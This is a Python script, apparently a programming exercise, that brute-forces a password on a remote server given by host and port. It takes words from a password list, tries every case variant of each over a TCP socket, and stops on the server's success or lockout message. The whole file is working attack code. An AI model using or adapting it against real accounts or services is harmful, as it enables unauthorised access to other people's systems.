import argparse
import socket
import string

def all_numbers(pw):
    check = [k for k in pw if k in string.digits]
    if len(check) == len(pw):
        # print(pw)
        return True


def hack(password):
    count_comb = 2 ** len(password)

    if all_numbers(password) == True:
        yield password
    else:
        for a in range(count_comb):
            word = list(password.lower())
            binary = str(format(a, 'b'))
            if len(binary) < len(word):
                for i in range(1, len(word)):
                    if len(binary) == i:
                        add = (len(word) - i) * '0'
                        binary = f'{add}{binary}'
            for index, letter in enumerate(word):
                if letter in string.ascii_lowercase:
                    if binary[index] == '0':
                        word[index] = letter.lower()
                    if binary[index] == '1':
                        word[index] = letter.upper()
            yield ''.join(word)


password_file = open('passwords.txt', 'r')
max_lines = 1000
max_n = 100000

parser = argparse.ArgumentParser()
parser.add_argument("host")
parser.add_argument("port")

args = parser.parse_args()

client = socket.socket()
address = (args.host, int(args.port))
client.connect(address)

for i in range(max_lines):
    line = password_file.readline().strip()
    hack_generator = hack(line)
    for i in range(max_n):
        try:
            attempt = next(hack_generator)
            message = attempt.encode()
            client.send(message)
            response = client.recv(1024)
            response = response.decode()
            if response == "Connection success!":
                print(attempt)
                break
            elif response == "Too many attempts!":
                break
        except:
            break

password_file.close()
client.close()


